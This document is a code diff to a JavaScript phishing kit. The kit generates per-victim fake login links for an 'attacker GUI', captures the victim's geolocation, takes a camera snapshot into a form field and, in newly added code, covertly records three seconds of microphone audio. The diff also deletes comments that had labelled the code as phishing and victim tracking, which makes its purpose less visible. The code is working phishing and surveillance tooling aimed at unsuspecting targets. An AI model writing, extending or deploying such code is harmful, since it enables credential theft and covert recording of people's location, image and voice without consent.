@@ -1,12 +1,11 @@
 function generateLink() {
   const platform = document.getElementById("platform").value;
-  const attackerId = Math.random().toString(36).substring(2, 15); // Random ID
+  const attackerId = Math.random().toString(36).substring(2, 15);
   const link = `${window.location.origin}/${platform}-login/${attackerId}`;
   document.getElementById("link-output").innerHTML =
     `Send this link: <a href="${link}">${link}</a>`;
 }
 
-// Generate phishing link (for attacker GUI)
 function generateLink() {
   const platform = document.getElementById("platform").value;
   const attackerId = Math.random().toString(36).substring(2, 15);
@@ -15,7 +14,6 @@ function generateLink() {
     `Send this link: <a href="${link}">${link}</a>`;
 }
 
-// Get victim's location
 function getLocation() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
@@ -30,7 +28,6 @@ function getLocation() {
   }
 }
 
-// Get camera access and take snapshot
 function getCameraAccess() {
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
@@ -41,18 +38,50 @@ function getCameraAccess() {
       .getUserMedia({ video: true })
       .then((stream) => {
         video.srcObject = stream;
-        // Wait a moment for video to load, then capture snapshot
         setTimeout(() => {
           const context = canvas.getContext("2d");
           context.drawImage(video, 0, 0, 320, 240);
           const dataUrl = canvas.toDataURL("image/png");
           snapshotInput.value = dataUrl;
-          // Stop the video stream
+
           stream.getTracks().forEach((track) => track.stop());
         }, 1000);
       })
       .catch((err) => {
         console.log("Camera access denied");
+      });
+  }
+}
+
+function getMicAccess() {
+  const audioInput = document.getElementById("audio");
+
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices
+      .getUserMedia({ audio: true })
+      .then((stream) => {
+        const mediaRecorder = new MediaRecorder(stream);
+        const audioChunks = [];
+
+        mediaRecorder.ondataavailable = (event) => {
+          audioChunks.push(event.data);
+        };
+
+        mediaRecorder.onstop = () => {
+          const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
+          const reader = new FileReader();
+          reader.readAsDataURL(audioBlob);
+          reader.onloadend = () => {
+            audioInput.value = reader.result;
+          };
+          stream.getTracks().forEach((track) => track.stop());
+        };
+
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 3000); // Record for 3 seconds
+      })
+      .catch((err) => {
+        console.log("Microphone access denied");
       });
   }
 }
